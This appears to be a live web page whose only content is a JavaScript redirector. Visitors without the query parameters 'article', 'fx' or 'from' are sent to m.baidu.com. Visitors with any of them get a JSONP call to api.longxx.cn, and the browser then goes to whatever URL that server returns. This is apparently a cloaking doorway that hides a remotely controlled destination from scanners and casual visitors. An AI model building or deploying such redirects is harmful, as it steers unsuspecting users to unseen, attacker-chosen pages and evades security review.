<script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
<script>
    function getQueryVariable(variable)
    {
           var query = window.location.search.substring(1);
           var vars = query.split("&");
           for (var i=0;i<vars.length;i++) {
                   var pair = vars[i].split("=");
                   if(pair[0] == variable){return pair[1];}
           }
           return(false);
    }   
    if(!getQueryVariable('article') && !getQueryVariable('fx') && !getQueryVariable('from')){
        location.href = 'https://m.baidu.com/';
    } else{
  $.ajax({
            type:"GET",
            url:'https://api.longxx.cn/jin-61/0608newsp/index_rukou.php',
            dataType:"jsonp",
            jsonp:"callback",
            data:{
               
            },
            success:function(res){
                 location.href = res.url;
            },

            error: function (e) {
                console.log(e)
            }

        });
    }
</script>
